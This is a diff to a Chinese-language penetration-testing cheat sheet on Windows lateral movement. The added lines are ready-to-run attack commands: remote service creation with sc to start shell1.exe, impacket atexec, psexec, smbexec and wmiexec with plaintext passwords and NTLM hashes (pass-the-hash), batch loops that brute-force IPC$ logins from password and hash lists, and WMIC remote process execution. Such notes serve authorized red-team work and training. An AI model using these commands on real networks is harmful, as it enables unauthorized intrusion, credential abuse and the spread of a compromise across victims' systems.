@@ -496,7 +496,7 @@ Reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
 
 ```
 
-## at&schtasks横向
+## at&schtasks&sc横向
 
 使用明文密码登录到目标，需要135端口开启：
 ```
@@ -512,10 +512,54 @@ Windows server 2012及以上使用schtasks命令
 Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
 Schtasks /run /s 192.168.2.148 /tn executefile /i
 Schtasks /delete /s 192.168.2.148 /tn executefile /f
+
+sc \\192.168.210.107 create hackerbinpath="c:\shell1.exe"   #创建服务
+sc \\192.168.210.107 start hacker      #启动hacker服务
 ```
 
+## impacket命令
+```
+需要135端口开启
+Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
+
+Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
 
 
+已知密码和用户批量连接ip:
+FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
+
+已知用户和ip批量连接密码：
+FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator
+
+已知用户和ip批量连接hash：
+FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+
+
+官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
+Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
+Psexec \192.168.202.148 -accepteula -s cmd
+
+官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
+Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd
+
+PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方执行不了)
+
+需要445端口开启
+Smbexec test/Administrator:zxcvbnm123@192.168.202.148
+Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
+
+WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
+第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
+Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create "cmd.exe /c ipconfig >C:/1.txt"
+
+第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀
+Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123
+
+第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显
+Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 "whoami"
+Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 "whoami"
+
+```
 
 
 
